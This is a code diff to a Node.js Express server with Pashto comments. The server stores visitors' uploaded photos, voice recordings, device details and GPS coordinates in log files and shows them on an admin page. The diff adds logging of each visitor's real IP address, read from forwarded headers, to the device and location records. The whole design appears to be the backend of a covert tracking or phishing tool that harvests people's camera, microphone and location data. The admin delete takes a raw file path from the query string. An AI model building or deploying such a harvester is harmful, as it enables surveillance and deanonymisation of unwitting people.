@@ -6,6 +6,9 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// د پراکسی یا کلاوډ هوسټینګ (لکه Render) لپاره د IP د سوابقو سمولو په موخه
+app.set('trust proxy', true);
+
 const uploadDir = path.join(__dirname, 'uploads');
 const photosDir = path.join(uploadDir, 'photos');
 const voicesDir = path.join(uploadDir, 'voices');
@@ -45,14 +48,22 @@ app.get('/', (req, res) => {
 });
 
 app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), (req, res) => {
-    // ۱. د موبایل د معلوماتو ساده او پاک خوندي کول
+    // د لیدونکي د ریښتیني IP پته معلومول
+    let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'نامعلوم';
+    if (clientIp.includes(',')) {
+        clientIp = clientIp.split(',')[0].trim();
+    }
+    if (clientIp === '::1' || clientIp === '::ffff:127.0.0.1') {
+        clientIp = '127.0.0.1 (Localhost)';
+    }
+
+    // ۱. د موبایل، برانډ او IP معلوماتو خوندي کول
     if (req.body.device_info) {
         try {
             const info = JSON.parse(req.body.device_info);
             const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
             
-            // دلته شکل په بشپړ ډول د ستاسو د غوښتنې سره سم پاک شو
-            const entry = `📅 نېټه: ${time}\n📱 د وسیلې ډول: ${info.deviceType}\n🔢 د انډرایډ ورژن: ${info.androidVer}\n📐 د سکرین اندازه: ${info.screenSize}\n🔋 د بیټرۍ چارج: ${info.batteryLevel}\n🌐 د براوزر ژبه: ${info.language}\n-----------------------------------\n`;
+            const entry = `📅 نېټه: ${time}\n🌐 د لیدونکي آی‌پي (IP): ${clientIp}\n📱 د وسیلې برانډ: ${info.deviceType}\n🔢 د انډرایډ ورژن: ${info.androidVer}\n📐 د سکرین اندازه: ${info.screenSize}\n🔋 د بیټرۍ چارج: ${info.batteryLevel}\n🌐 د براوزر ژبه: ${info.language}\n-----------------------------------\n`;
             
             fs.appendFileSync(path.join(deviceInfoDir, 'device_info.txt'), entry, 'utf8');
             return res.send("Device Info Saved");
@@ -65,7 +76,7 @@ app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), (req, res) 
         const lng = parseFloat(req.body.longitude);
         if (!isNaN(lat) && !isNaN(lng)) {
             const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
-            const entry = `نېټه: ${time} | لوکیشن: https://maps.google.com/?q=${lat},${lng}\n-----------------------------------\n`;
+            const entry = `نېټه: ${time} | آی‌پي: ${clientIp} | لوکیشن: https://maps.google.com/?q=${lat},${lng}\n-----------------------------------\n`;
             fs.appendFileSync(path.join(locationsDir, 'locations.txt'), entry, 'utf8');
             return res.send("Location Saved");
         }
@@ -158,7 +169,7 @@ app.get('/admin', (req, res) => {
             voicesHtml += `
                 <div class='item-box' style='margin-bottom: 8px; text-align: right; padding: 8px;'>
                     <audio controls src="/${filePath}"></audio>
-                    <div style='text-align: left; margin-top: 5px;'><a href="/admin?delete=${filePath}" class='delete-btn' onclick="return confirm('دا غږ ډليټ شي؟')">ډليټ کول</a></div>
+                    <div style='text-align: left; margin-top: 5px;'><a href="/admin?delete=${filePath}" class='delete-btn' onclick="return confirm('دا عکس ډليټ شي؟')">ډليټ کول</a></div>
                 </div>`;
         });
     }
